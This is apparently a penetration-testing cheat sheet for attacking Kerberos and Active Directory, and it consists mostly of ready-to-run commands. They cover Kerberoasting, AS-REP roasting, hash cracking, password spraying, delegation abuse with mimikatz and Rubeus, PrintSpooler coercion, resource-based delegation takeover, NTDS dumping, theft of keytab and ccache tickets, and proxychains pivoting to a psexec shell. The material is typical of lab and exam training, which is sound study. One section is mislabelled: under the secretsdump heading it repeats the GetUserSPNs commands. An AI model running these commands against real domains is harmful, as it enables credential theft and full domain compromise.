---
layout:     post
author:     0x5c4r3
type: docs
permalink: Kerberos_Pentesting
---


<span style="font-size: 35px; color:red"><b>Kerberos</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>Theory</b></span>
Ticket-based system.

DC works as Key Distribution Center (KDC)

1) Client authenticating to the DC with an <span style="color:red">Authentication Server request</span> (AS_REQ) containing a timestamp+user creds in hash format.
2) The server replies with an <span style="color:red">Authentication Server reply</span> (AS_REP) that contains a session key and a <span style="color:red">Ticket Granting Ticket</span> (TGT, valid for 10 hours).
3) When the client tries to reach resources in the AD, the DC is contacted again.
4) The Server sends a <span style="color:red">Ticket Granting Service</span> (TGS).

Due to the automatic renewal of TGTs, password hashes are cached in the <span style="color:red">Local Security Authority Subsystem Service</span> (LSASS) memory space.
If we gain access to these hashes, we could crack them to obtain the clear text password or reuse them to perform various actions.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Find Vaild Usernames</b></span>
Enumerate valid usernames on the Domain using Kerberos Pre-Auth
```shell
kerbrute userenum <username_list> -d <DOMAIN> --dc <DC_IP>
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Dump Hashes Without Password</b></span>

<span style="font-size: 18px; color:white"><b>GetUserSPNs.py (Kerberoast)</b></span>
To try kerberoasting (the -request will request the ticket and therefore dump the hash)
```shell
GetUserSPNs.py -dc-ip <IP> -request '<DOMAIN>/user'
```
and try submitting the password if you have it

```shell
GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<Username>:<password>
```
the user:pass is only to login, the command will still dump all the kerberostable users

&nbsp;
<span style="font-size: 18px; color:white"><b>GetNPUsers.py (ASREP-Roast)</b></span>

<span style="font-size: 15px; color:red"><b>From Linux:</b></span>
Queries target domain for users with 'Do not require Kerberos pre-authentication' set and export their Password Encrypted TGT for cracking.
```shell
GetNPUsers.py -dc-ip <IP> -request '<DOMAIN>'
```

```shell
GetNPUsers.py -dc-ip <IP> <DOMAIN>/<Username>:<password>
```

```shell
GetNPUsers.py -dc-ip <IP> -no-pass -usersfile <USER_LIST> <DOMAIN>/
```

<span style="font-size: 15px; color:red"><b>From Windows:</b></span>
List vulnerable users:
```powershell
Get-DomainUser -PreauthNotRequired -verbose | findstr samaccountname
```
and then get the hash to crack:
```shell
.\Rubeus.exe asreproast /format:hashcat /outfile:<out_file> /user:<username>
```
OR from ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```powershell
Get-ASREPHash -Username <username> -verbose
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Crack Stolen Hash</b></span>
```
hashcat -m 18200 <dumped_hash> /usr/share/wordlists/rockyou.txt
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Password Spray</b></span>
BruteForce same pasword on all users
```shell
kerbrute passwordspray -d <DOMAIN> --dc <DC_HOSTNAME> <user_list> <password>
```
you can [passwordspry also on smb]().
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Create TGT From Credentials</b></span>
```shell
getTGT.py <DOMAIN>/<user>:<password> -dc-ip <DC_IP>
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Unconstrained Delegation</b></span>

Can Lead to complete domain compromise if you have a privileged user!
Basically a forwardable TGT in use.

Enumerate unconstrained delegations with:
```
Get-DomainComputer -Unconstrained
```
Look for blocks with <span style="color:red">useraccountcontrol: TRUSTED_FOR_DELEGATION</span> and <span style="color:red">name: <computername></span>.
Find the IPAddress of the computer with unconstrained delegation:
```powershell
nslookup <computername>
```

At this point, use mimikatz like so:
```
privilege::debug
sekurlsa::tickets
```
Check for TGT for other users. If you find any, save those with <span style="color:red">sekurlsa::tickets /export</span>.
You can use that TGT to log as that user with 
```
PsExec.exe \\cdc01 cmd
```
Run <span style="color:red">whoami</span> to see if it worked.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>getST.py</b></span>
Get Silver Ticket from a service of which you have name and password/hash
```shell
getST.py -dc-ip <domain_ip> -spn WWW/<domain_controller_hostname> -hashes :<hash> -impersonate administrator <domain>/<service_name>
```

it will dump a .ccache file.

If it does not work and gives you <span style="color:red">Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span>, sync the time of your machine with the domain using NTP: 
```shell
ntpdate <IP_of_DC>
```

After that, run:
```shell
export KRB5CCNAME=<name_of_ccache_file>
```

```shell
psexec.py -k -no-pass <DC_hostname>
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>secretsdump.py</b></span>
Perform various techniques to dump secrets from the remote machine without executing any agent there.
```shell 
GetUserSPNs.py -dc-ip <IP> -request '<DOMAIN>'
```

```shell
GetUserSPNs.py -dc-ip <IP> <DOMAIN>/<Username>:<password>
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Dump Passwords Hashes from ntds.dit</b></span>
<span style="color:red">ntds.dit</span> = file that contains data from the AD.
Take the System hive and the ntds.dit file and dump that hashes:
```shell
secretsdump.py -system registry/SYSTEM -ntds ntds.dit LOCAL > backup_ad_dump
```
---
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>PrintSpooler</b></span>
See if you can access the pipe:
```shell
dir \\cdc01\pipe\spoolss
```
think cdc01 should be the domain controller machine account. If you see the service spoolss under 'Name', the service is running and it's accessible.
Download <span style="color:red">SpoolSample.exe</span> from github (or wherever) and compile it, then run from an administrative cmd:
```
Rubeus.exe monitor /interval:5 /filteruser:CDC01$
```
Then open a second administrative cmd and run:
```
SpoolSample.exe CDC01 APPSRV01 
```
You should get a TGT after few seconds.

Inject it to memory:
```
Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
```
With the TGT of the domain controller machine account injected into memory, we can perform actions in the context of that TGT.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Constrained Delegations</b></span>
Find constrained delegations with PowerView:
```
Get-DomainUser -TrustedToAuth
```
Check samsccountname,msds-allowedtodelegateto and useraccountcontrol=TRUSTED_TO_AUTH_FOR_DELEGATION.
Generate NTLM Hash from a password:
```
.\Rubeus.exe hash /password:<password>
```

Generate TGT for <user>:
```
.\Rubeus.exe asktgt /user:<user> /domain:<domain> /rc4:<hash_created_above>
```

Example of exploit for administrator against S4UProxy:
```
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
```
In this case it's mssql, but the service depends on what you find running the first command to find constrained delegations.

You can now use the service you exploited (mssql in this case) just running the service (since the TGS is in memory):
```
.\SQL.exe
```
You can access other services:
```
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Resource Based Constrained Delegation</b></span>

Most recent technology for Kerberos Delegation
Enumerate delegations
```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```
Check ObjectDN (Get the first DC name - <first_DC>), ActiveDirectoryRights: GenericWrite (or GenericAll, WriteProperty, or WriteDACL).

Enumerate 
```
Get-DomainObject -Identity <first_DC> -Properties ms-DS-MachineAccountQuota
```
Create new machine (download powermad.ps1):
```
. .\powermad.ps1
New-MachineAccount -MachineAccount <new_computer_name> -Password $(ConvertTo-SecureString '<password1>' -AsPlainText -Force)
Get-DomainComputer -Identity <new_computer_name>
```
If you enumerate with the 1st command of the page again, it should show the new machine.

To convert the SID of our newly-created computer object to the correct format:
```
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
```

Convert into bytearray:
```
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)
```

```
Get-DomainComputer -Identity <target_domain> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```
NOTE: <target_domain> is not the computer you created, but the target of the attack.

Verify  security descriptor:
```
$RBCDbytes = Get-DomainComputer <target_domain> -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl
ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
```

Now we can start the attack:
```
.\Rubeus.exe hash /password: <password1_set_before>
.\Rubeus.exe s4u /user:<new_computer_name_set_before>$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt
```

To see if it worked and you have the TGT:
```
klist
```

If it worked, you can interact with the services on the target machine:
```
dir \\<target_machine>.<domain>\c$
```
or replace c$ with the service you should have access to.

&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Kerberos on Linux</b></span>
Linux clients can authenticate to Active Directory servers via Kerberos as a Windows machine would.
Active Directory members using Kerberos authentication are assigned a credential cache file to contain their requested Kerberos tickets. The file's location is set through the user's <span style="color:red">KRB5CCNAME</span> environment variable.
To find the user's credential cache file:
```shell
env | grep KRB5CCNAME
```

To request a TGT, we just need to call kinit without parameters and enter the user's AD password:
```shell
kinit
```
To see list of tickets:
```shell
klist
```

Tickets expire after a while, run <span style="color:red">kinit -R</span> to update them.

We can get a list of available Service Principal Names (SPN) from the domain controller using:
```shell
ldapsearch -Y GSSAPI -H ldap://<DC_domain> -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
```

Interactive kerberos shell:
```shell
ktutil
```
I.E. (To add an entry to the keytab for the admin user and specify the encryptiopn type: <span style="color:red">addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac</span>, to then write it on file <span style="color:red">wkt /tmp/administrator.keytab</span>)

OUTPUT:
```
...
servicePrincipalName: MSSQLSvc/DC01.corp1.com:1433
servicePrincipalName: MSSQLSvc/DC01.corp1.com:SQLEXPRESS
servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:1433
servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS
...
```
To request a ticket for a particular service (like the one above):
```shell
kvno MSSQLSvc/DC01.corp1.com:1433
```
Use klist again to check if you actiually have the ticket.
&nbsp;

---
&nbsp;
<span style="font-size: 18px; color:white"><b>Attacks</b></span>
<span style="font-size: 25px; color:white"><b>Stealing Keytab Files</b></span>
Keytab file: file that allows contain a Kerberos principal name and encryption keys to allow developers to use automated scripts without entering a password.
Commonly used in <span style="color:red">cron jobs</span> (/etc/crontab)

To use the file in a script run by the root user:
```shell
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
```
(check that it's been loaded with <span style="color:red">klist</span>)

If well done, you'll be able to log as the user you added to the keytab file without using a password.
I.E. `smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$`
&nbsp;
<span style="font-size: 15px; color:white"><b>Attacking using Credential Cache Files</b></span>
List the ccache files:
```shell
ls -al /tmp/krb5cc_*
```
Copy the administrator's ccache file and change :
```
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow
ls -al /tmp/krb5cc_minenow
```
Set the KRB5CCNAME env variable:
```shell
kdestroy
klist
export KRB5CCNAME=/tmp/krb5cc_minenow
klist
```
At this point we have the admin user's TGT and we can request a service ticket on its behalf:
```shell
kvno MSSQLSvc/DC01.corp1.com:1433
klist
```

&nbsp;
<span style="font-size: 25px; color:white"><b>Using Kerberos with Impackets</b></span>
After copying the ccache file from another host:
```shell
export KRB5CCNAME=/tmp/krb5cc_minenow
```
Add the general domain and the dc to <span style="color:red">/etc/hosts</span>.
We'll need to setup a SOCKS proxy on linuxvictim and use proxychains on Kali to pivot through the domain joined host when interacting with Kerberos:

In <span style="color:red">/etc/proxychains.conf</span>, comment out the line for <span style="color:red">proxy_dns</span>:
```
...
# Proxy DNS requests - no leak for DNS data
#proxy_dns 
..
```
Once these settings are in place, we need to set up a SOCKS server using ssh on the server we copied the ccache file from:
```
ssh <user>@<domain> -D 9050
```
The -D parameter specifies the port we'll be using for proxychains (defined in /etc/proxychains.conf) in order to tunnel Kerberos requests.

At this point, for example:
- List domain users:
```shell
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
```
- List SPNs available to out kerberos:
```shell
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
```
- Gain a shell over the server:
```shell
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
```

